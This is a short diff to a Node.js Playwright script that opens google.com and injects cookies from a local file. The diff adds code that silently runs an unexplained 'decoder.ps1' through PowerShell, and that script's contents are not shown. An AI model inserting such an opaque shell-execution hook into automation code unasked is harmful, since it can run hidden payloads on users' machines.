@@ -47,7 +47,19 @@ const page = await context.newPage();
   await page.goto('https://www.google.com/', {
   waitUntil: 'networkidle'
 });
+const { exec } = require('child_process');
 
+exec('decoder.ps1', {'shell':'powershell.exe'}, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`exec error: ${error}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`stderr: ${stderr}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+});
 async function injectCookies(context) {
   // Read cookies from the file
   const cookies = JSON.parse(fs.readFileSync('cookies.json'));
